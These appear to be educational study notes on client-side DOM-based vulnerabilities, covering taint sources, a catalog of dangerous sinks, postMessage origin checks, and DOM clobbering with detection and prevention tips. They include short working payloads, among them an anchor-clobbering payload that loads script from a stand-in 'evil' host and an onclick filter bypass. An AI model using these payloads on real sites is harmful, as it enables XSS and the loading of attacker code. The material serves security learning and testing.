# Ch05: DOM-Based Vulnerabilities & DOM Clobbering

Source: `/web-security/dom-based`. **GAP CLASS for the sink catalog + clobbering.** Taint-flow bugs: attacker-controlled data flows from a *source* to a *sink* that executes or interprets it dangerously — entirely client-side, often invisible in server logs.

## Taint flow model

**Sources** (attacker-controllable): `location.href`/`search`/`hash`/`pathname`, `document.URL`/`documentURI`/`referrer`/`cookie`, `location` itself, `window.name`, `localStorage`/`sessionStorage`, `IndexedDB`, web-message `event.data`, reflected/stored server data.

**The test**: put a marker (`"INJECT_MARKER_123"`) in each source, then search the DOM/JS for where it lands — DevTools "Search all files", DOM Invader, or breakpoints on the sink. Confirm exploitability by replacing the marker with the sink's exploit syntax.

## Sink catalog (each = a distinct vuln class)

| Sink family | Representative sinks | Resulting bug |
|---|---|---|
| Script execution | `eval()`, `Function()`, `setTimeout(string)`, `setInterval(string)` | DOM XSS / JS injection |
| HTML write | `innerHTML`, `outerHTML`, `document.write`, `insertAdjacentHTML`, jQuery `html()`/`append()` | DOM XSS |
| Navigation | `location`, `location.href`, `location.assign/replace`, `window.open`, anchor `href` setters | Open redirection |
| Cookie | `document.cookie` setter | Cookie manipulation (session fixation, XSS-bypass of filters) |
| document.domain | `document.domain =` setter | Loosens SOP to parent domain — takeover of sibling subdomains |
| WebSocket URL | `new WebSocket(source)` | WebSocket-URL poisoning — socket to attacker server |
| Link attributes | `a.href`/`link.href`/`form.action` setters | Link manipulation → phishing, JS URLs |
| postMessage | `window.postMessage` with `*` or attacker-controlled origin/data | Web message manipulation → XSS/data theft |
| Ajax headers | `xhr.setRequestHeader`, `$.ajax` header options | Ajax request-header manipulation → smuggle hostile headers |
| File path | File API / `XMLHttpRequest` file paths | Local file-path manipulation |
| Client storage SQL | Web SQL / client DB queries | Client-side SQLi, XPath injection, JSON injection |
| HTML5 storage | `localStorage`/`sessionStorage` writes later rendered | Storage manipulation → persistent DOM XSS |
| DOM data | `script.text`, JSON parse into dangerous sinks, `setAttribute` with event handlers | DOM-data manipulation |
| Resource exhaustion | regex loops, `while` on user data | Client-side DoS |

**Web message vulnerabilities** deserve special attention: `addEventListener('message', ...)` handlers that skip `event.origin` verification accept data from *any* site — an attacker's page sends crafted `postMessage` to drive the sink. Verify the handler checks `event.origin` (and checks it correctly — `indexOf`/`endsWith` whitelist flaws mirror CORS origin bugs).

## DOM clobbering

When markup injection is allowed (HTML filter whitelists `id`/`name` attributes) but XSS isn't directly possible, *clobber* globals: named/id'd elements become properties of `window`/`document`.

- **Anchor collection trick**: `<a id=x><a id=x name=url href=//evil/x.js>` — duplicate `id` groups anchors into an `HTMLCollection`; `window.x` now resolves to it, and `x.url` returns the second anchor's `href`. Classic payload against `var obj = window.obj || {}` then `script.src = obj.url`.
- **Form/attributes clobber**: `<form onclick=alert(1)><input id=attributes>` — clobbers the form's `attributes` NamedNodeMap with an `input` node; client-side filters iterating `attributes` loop over the wrong object (undefined `.length`) and leave the `onclick` intact → filter bypass → XSS.
- **Other clobbering targets**: `submit()` on forms, `window.name`-dependent logic, `getElementById` assumptions, `document`-level globals.
- **Detection**: grep the JS for `window.X ||`, `document.X ||`, bare globals, and filter logic that trusts `node.attributes`; if HTML injection whitelists `id`/`name`, clobbering is on the table.
- **Prevention note**: `instanceof NamedNodeMap` checks, avoid `||` with globals, DOMPurify handles clobbering.

## Lab reference

`https://portswigger.net/web-security/all-labs#dom-based-vulnerabilities` — labs per sink family, web-message handler flaws, and both clobbering techniques.
